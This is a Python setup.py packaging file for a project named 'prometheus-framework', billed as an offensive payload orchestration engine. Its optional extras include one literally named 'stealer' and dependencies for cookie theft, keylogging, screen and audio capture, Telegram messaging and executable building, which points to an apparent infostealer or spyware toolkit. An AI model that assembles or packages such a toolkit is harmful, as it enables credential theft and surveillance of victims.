#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from setuptools import setup, find_packages

with open("README.md", "r", encoding="utf-8") as f:
    long_description = f.read()

setup(
    name="prometheus-framework",
    version="1.0.0",
    author="Prometheus-Up-Fable-Cyclops",
    description="Sovereign Offensive Framework - Modular Payload Orchestration Engine",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/yourorg/prometheus",
    packages=find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "License :: Other/Proprietary License",
        "Operating System :: OS Independent",
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
        "Topic :: Security",
        "Topic :: Software Development :: Libraries :: Python Modules",
    ],
    python_requires=">=3.9",
    install_requires=[
        "customtkinter>=5.2.0",
        "cryptography>=41.0.0",
        "jinja2>=3.1.0",
        "pyyaml>=6.0",
        "requests>=2.31.0",
        "python-dotenv>=1.0.0",
        "python-telegram-bot>=20.0.0",
        "pyinstaller>=6.0.0",
        "psutil>=5.9.0",
        "Pillow>=10.0.0",
        "pywin32>=306; sys_platform == 'win32'",
    ],
    extras_require={
        "dev": [
            "black",
            "flake8",
            "mypy",
            "pytest",
            "pytest-cov",
            "pytest-asyncio",
            "sphinx",
            "bandit",
        ],
        "stealer": [
            "browser-cookie3>=0.19.0",
            "discord.py>=2.3.0",
            "GPUtil>=1.4.0",
            "screeninfo>=0.8.0",
            "wmi>=1.5.1",
        ],
        "all": [
            "browser-cookie3>=0.19.0",
            "discord.py>=2.3.0",
            "GPUtil>=1.4.0",
            "screeninfo>=0.8.0",
            "wmi>=1.5.1",
            "opencv-python>=4.8.0",
            "mss>=9.0.0",
            "keyboard>=0.13.0",
            "pyautogui>=0.9.54",
            "pynput>=1.7.6",
            "sounddevice>=0.4.6",
            "scipy>=1.11.0",
            "flask>=2.3.0",
            "flask-cors>=4.0.0",
            "loguru>=0.7.0",
        ],
    },
    entry_points={
        "console_scripts": [
            "prometheus=main:main",
        ],
    },
    include_package_data=True,
    zip_safe=False,
)
